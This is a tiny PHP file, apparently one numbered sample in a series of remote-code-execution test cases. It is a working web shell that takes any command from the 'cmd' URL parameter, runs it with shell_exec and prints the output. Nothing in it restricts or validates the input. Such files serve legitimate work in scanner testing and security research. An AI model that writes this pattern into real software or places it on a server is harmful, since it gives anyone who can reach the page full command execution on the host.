<?php
// RCE test variation #242
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>